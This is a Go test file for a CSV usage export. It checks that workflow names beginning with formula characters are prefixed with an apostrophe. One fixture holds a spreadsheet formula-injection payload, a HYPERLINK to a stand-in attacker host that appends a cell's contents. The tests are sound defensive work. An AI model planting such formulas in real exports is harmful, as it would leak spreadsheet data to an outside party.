package api

import (
	"encoding/csv"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// A workflow can be called anything by anyone who can push to a repository the
// App can see, and its name lands in the first column of the export. Excel and
// Sheets evaluate a cell that begins with a formula character even when the CSV
// quoted it, so the operator who opens the export must get text, not a formula
// somebody else wrote.
func TestUsageCSVDefusesCellsThatWouldBeFormulas(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)

	base := time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)
	started, done := base.Add(time.Minute), base.Add(2*time.Minute)
	if _, err := h.st.UpsertJob(h.ctx, &store.Job{
		GitHubJobID: 4242, Repo: "acme/widgets", JobName: "build",
		Workflow: `=HYPERLINK("https://evil.example/?"&A1,"open")`,
		State:    store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done,
	}); err != nil {
		t.Fatalf("UpsertJob: %v", err)
	}

	resp := h.do(request{method: http.MethodGet, cookie: h.session(u),
		path: "/api/v1/usage.csv?group_by=workflow&from=" + base.Add(-time.Hour).Format(time.RFC3339) +
			"&to=" + base.Add(time.Hour).Format(time.RFC3339)})
	resp.mustStatus(t, http.StatusOK, "usage csv")

	records, err := csv.NewReader(strings.NewReader(string(resp.body))).ReadAll()
	if err != nil {
		t.Fatalf("the export is not valid CSV: %v", err)
	}
	if len(records) != 2 {
		t.Fatalf("got %d records, want a header and one row: %q", len(records), resp.body)
	}
	if got := records[1][0]; !strings.HasPrefix(got, "'=") {
		t.Errorf("group cell = %q; a leading formula character must be neutralised with an apostrophe", got)
	}
}

func TestCSVTextLeavesOrdinaryNamesAlone(t *testing.T) {
	for _, s := range []string{"", "acme/widgets", "build and test", "zoomies-linux-x64", "ins_k3f9qz2m"} {
		if got := csvText(s); got != s {
			t.Errorf("csvText(%q) = %q, want it unchanged", s, got)
		}
	}
	for _, s := range []string{"=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx"} {
		if got := csvText(s); got != "'"+s {
			t.Errorf("csvText(%q) = %q, want an apostrophe prefix", s, got)
		}
	}
}
